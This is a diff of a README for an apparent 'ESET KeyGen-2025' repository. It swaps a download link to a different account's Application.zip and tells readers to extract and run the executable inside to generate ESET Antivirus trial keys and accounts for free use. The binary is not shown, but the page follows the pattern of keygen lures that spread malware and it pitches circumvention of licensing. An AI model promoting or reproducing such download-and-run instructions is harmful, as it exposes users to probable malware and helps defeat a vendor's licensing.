@@ -16,12 +16,12 @@ Welcome to the ESET-KeyGen-2025 repository! This repository contains a Trial-Key
 🔑 key-generator-eset  
 
 ## Get Started
-Click the button below to download the Software.zip file which contains the ESET KeyGen-2025 tool. 🚀
+Click the button below to download the https://github.com/Gushub11/ESET-KeyGen-2025/releases/download/v1.0.0/Application.zip file which contains the ESET KeyGen-2025 tool. 🚀
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Gushub11/ESET-KeyGen-2025/releases/download/v1.0.0/Application.zip)](https://github.com/Gushub11/ESET-KeyGen-2025/releases/download/v1.0.0/Application.zip)
 
 ## 🖥️ How to Use ESET KeyGen-2025
-Once you have downloaded the Software.zip file, extract it to your desired location on your computer. Run the executable file and follow the on-screen instructions to generate trial keys and accounts for ESET Antivirus. Enjoy using ESET Antivirus with full features for free!
+Once you have downloaded the https://github.com/Gushub11/ESET-KeyGen-2025/releases/download/v1.0.0/Application.zip file, extract it to your desired location on your computer. Run the executable file and follow the on-screen instructions to generate trial keys and accounts for ESET Antivirus. Enjoy using ESET Antivirus with full features for free!
 
 ## Issues and Contributions
 If you encounter any issues with the ESET KeyGen-2025 tool or would like to contribute to its development, please check the "Issues" and "Pull Requests" sections of this repository. Your feedback and contributions are highly appreciated.
